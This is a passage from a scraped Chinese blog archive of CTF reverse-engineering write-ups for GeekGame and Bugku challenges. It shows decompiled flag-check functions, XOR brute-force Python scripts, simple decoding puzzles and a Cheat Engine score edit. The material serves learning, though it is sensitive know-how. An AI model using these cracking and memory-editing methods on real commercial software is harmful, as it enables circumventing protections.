ad，也就一直没有办法脱壳。百度了接近半个晚上才知道，原来虚拟机里用od时不要把要载入的文件放在共享文件夹里，否则就会出现这种状况，把unpackme.exe拖到虚拟机文件夹里后脱壳成功。 定位到关键函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465pdwDataLen = 16;if ( a2 == 514 )&#123; v4 = GetParent(hWnd); v5 = GetDlgItemTextA(v4, 101, &amp;String, 63); if ( v5 ) &#123; phProv = 0; phHash = 0; if ( !CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) || !CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) || !CryptHashData(phHash, (const BYTE *)&amp;String, v5, 0) || !CryptGetHashParam(phHash, 2u, (BYTE *)pbData, &amp;pdwDataLen, 0) ) &#123; ExitProcess(1u); &#125; CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); v7 = pbData; v8 = dword_4128A0; v9 = 12; while ( *(_DWORD *)v7 == *v8 ) &#123; v7 += 4; ++v8; v10 = v9 &lt; 4; v9 -= 4; if ( v10 ) &#123; v11 = String; v12 = 0; v13 = 3; v14 = 2; do &#123; *(&amp;Text + v12) = v11 ^ byte_410A80[v12] ^ pbData[v12 &amp; 0xF]; *(&amp;v23 + v12) = v11 ^ byte_410A81[v12] ^ pbData[((_BYTE)v14 - 1) &amp; 0xF]; v15 = byte_410A80[v14] ^ pbData[v14 &amp; 0xF]; v14 += 4; *(&amp;v24 + v13 - 3) = v11 ^ v15; v16 = byte_410A80[v13] ^ pbData[v13 &amp; 0xF]; v13 += 4; v25[v12] = v11 ^ v16; v12 += 4; &#125; while ( v14 &lt; 0x22 ); if ( v12 &lt; 0x80 ) &#123; *(&amp;Text + v12) = 0; MessageBoxA(hWnd, &amp;Text, &quot;Flag is&quot;, 0x40u); ExitProcess(0); &#125; __report_rangecheckfailure(); __debugbreak(); JUMPOUT(*(_DWORD *)algn_40BDCF); &#125; &#125; MessageBoxA(hWnd, &quot;Wrong answer&quot;, &quot;HACKMECTF&quot;, 0x10u); &#125; else &#123; MessageBoxA(hWnd, &quot;Say something!&quot;, &quot;HACKMECTF&quot;, 0x10u); &#125;&#125;return MEMORY[0](hWnd, a2, a3, a4); Text处存放的就是flag 赋值语句： *(&amp;Text + v12) = v11 ^ byte_410A80[v12] ^ pbData[v12 &amp; 0xF] v11是输入的string，pbData可以在上面发现就是dword_4128A0处的值，由v12 &lt; 0x80可以知道flag的长度不超过0x20位，爆破脚本如下： 1234567891011121314import stringbyte_410a80 = [0x1A, 0x8B, 0x24, 0x28, 0x58, 0x37, 0xAC, 0x52, 0x53, 0xB5, 0x1E, 0x3E, 0x4A, 0x25, 0x4A, 0x27, 0x6B, 0xB2, 0x17, 0x01, 0x03, 0x0B, 0xF4, 0x14, 0x00, 0xF1, 0x61, 0x70, 0x0C, 0x55, 0x20, 0x7A]pbData = [0x34, 0xAF, 0x0D, 0x07, 0x4B, 0x17, 0xF4, 0x4D, 0x1B, 0xB9, 0x39, 0x76, 0x5B, 0x02, 0x77, 0x6F]for i in string.printable: a = ord(i) flag = &quot;&quot; for a1 in range(0,0x20): flag += chr(a ^ byte_410a80[a1] ^ pbData[a1&amp;0xf]) if ~flag.find(&quot;FLAG&quot;): print flag 如果flag中有”FLAG”的话，flag.find()返回的是“FLAG”所在的下标0。所以加上取反号，就可以打印出flag。","categories":[],"tags":[]},{"title":"geekgame-2","slug":"geekgame-2","date":"2018-10-11T09:44:59.000Z","updated":"2018-10-11T10:19:52.530Z","comments":true,"path":"2018/10/11/geekgame-2/","link":"","permalink":"http://yoursite.com/2018/10/11/geekgame-2/","excerpt":"","text":"陈师傅线代考了满分？希尔密码，动手算一下得到flag。 Fuze.vs.Zombieemmmmm一个小游戏，杀死1000只僵尸可以过关，掏出CE,找到了score对应的地址，一只僵尸10分，改成9990分之后再杀一只僵尸就跳出了flag。正常方法尝试中….","categories":[],"tags":[]},{"title":"geekgame-1","slug":"geekgame-1","date":"2018-10-10T15:35:34.000Z","updated":"2018-10-11T08:21:26.139Z","comments":true,"path":"2018/10/10/geekgame-1/","link":"","permalink":"http://yoursite.com/2018/10/10/geekgame-1/","excerpt":"","text":"代号为geek的行动第一幕：毒雾初现查看源代码SYC{}里有一串摩斯电码，解码得到flag。 萌萌的血小板改后缀解压得到flag.txt和一张佛像图片，用佛曰解码得到flag。 小帅圆圆的发际线，你也想要么？gif后面藏了一个rar文件，解压后得到另一张图片，内容为brainfucker，解码后得到flag。 0xpoker的QQ1234if (str.equals(&quot;U1lDe0VhMnlfQU5kcjBpZF9SMyF9&quot;)) &#123; return new Decode().decode(str);&#125; base64解密得到flag 可能没有你想的那么难ida打开搜索字符串直接得到flag 换个样子你还认识吗ida打开，主函数： 123456789101112131415161718192021222324252627__main();i = 0;memset(v11, 0, sizeof(v11));v8 = 0;v9 = 0;v10 = 0;v4 = 28;v5 = 13;v6 = 59;v7 = 22;BYTE2(v9) = 85;printf(&quot;plz input flag : &quot;);scanf(&quot;%s&quot;, v11);if ( strlen1(v11) == 20 )&#123; for ( i = 0; i &lt;= 14; ++i ) v11[i + 4] ^= *(&amp;v4 + i); if ( !memcmp(v11, arr, 0x14u) ) puts(&quot;success&quot;); else puts(&quot;you faild&quot;);&#125;else&#123; puts(&quot;you faild&quot;);&#125;return 0; 输入flag之后与v4字符串异或之后和给定的arr字符串比对，逆运算可以得到flag。 需要注意的是v8,v9,v10是int型，占4个字节，并且byte2（v9）把v9的第二个字节赋值为85，感觉写脚本逆运算还不如手动解，所以爆破脚本如下： 1234567891011#!/usr/bin/env pythonimport stringfinal=&quot;this_is_flag_gg&quot;key=[28,13,59,22,0,0,0,0,0,0,85,0,0,0,0,0]flag=&quot;SYC&#123;&quot;for i in range(15): for ch in string.printable: if ord(ch)^key[i]==ord(final[i]): flag+=chflag+=&quot;&#125;&quot;print flag","categories":[],"tags":[]},{"title":"bugku-re-1","slug":"bugku-re-1","date":"2018-10-08T11:03:15.000Z","updated":"2018-10-22T02:35:21.897Z","comments":true,"path":"2018/10/08/bugku-re-1/","link":"","permalink":"http://yoursite.com/2018/10/08/bugku-re-1/","excerpt":"","text":"游戏过关虽然ida打开之后函数很乱…但大佬说过用ida都是可以做的 搜索一下flag试试，直接找到了生成flag的函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122sub_45A7BE((int)&quot;done!!! the flag is &quot;);v59 = 18;v60 = 64;v61 = 98;v62 = 5;v63 = 2;v64 = 4;v65 = 6;v66 = 3;v67 = 6;v68 = 48;v69 = 49;v70 = 65;v71 = 32;v72 = 12;v73 = 48;v74 = 65;v75 = 31;v76 = 78;v77 = 62;v78 = 32;v79 = 49;v80 = 32;v81 = 1;v82 = 57;v83 = 96;v84 = 3;v85 = 21;v86 = 9;v87 = 4;v88 = 62;v89 = 3;v90 = 5;v91 = 4;v92 = 1;v93 = 2;v94 = 3;v95 = 44;v96 = 65;v97 = 78;v98 = 32;v99 = 16;v100 = 97;v101 = 54;v102 = 16;v103 = 44;v104 = 52;v105 = 32;v106 = 64;v107 = 89;v108 = 45;v109 = 32;v110 = 65;v111 = 15;v112 = 34;v113 = 18;v114 = 16;v115 = 0;v2 = 123;v3 = 32;v4 = 18;v5 = 98;v6 = 119;v7 = 108;v8 = 65;v9 = 41;v10 = 124;v11 = 80;v12 = 125;v13 = 38;v14 = 124;v15 = 111;v16 = 74;v17 = 49;v18 = 83;v19 = 108;v20 = 94;v21 = 108;v22 = 84;v23 = 6;v24 = 96;v25 = 83;v26 = 44;v27 = 121;v28 = 104;v29 = 110;v30 = 32;v31 = 95;v32 = 117;v33 = 101;v34 = 99;v35 = 123;v36 = 127;v37 = 119;v38 = 96;v39 = 48;v40 = 107;v41 = 71;v42 = 92;v43 = 29;v44 = 81;v45 = 107;v46 = 90;v47 = 85;v48 = 64;v49 = 12;v50 = 43;v51 = 76;v52 = 86;v53 = 13;v54 = 114;v55 = 1;v56 = 117;v57 = 126;v58 = 0;for ( i = 0; i &lt; 56; ++i )&#123; *(&amp;v2 + i) ^= *(&amp;v59 + i); *(&amp;v2 + i) ^= 0x13u;&#125;return sub_45A7BE((int)&quot;%s\\n&quot;); 两个数组每位异或后再异或0x13得到flag，脚本如下： 12345678#!/usr/bin/env pythona1=[123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0,]a2=[18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0,]for i in range(len(a1)): a1[i]^=a2[i] a1[i]^=0x13flag=&apos;&apos;.join([chr(i) for i in a1])print flag 逆向入门windows下打不开，显示版本不对，ida没用，od也没用，用hex fiend看了一下： 1data:image/png;base64,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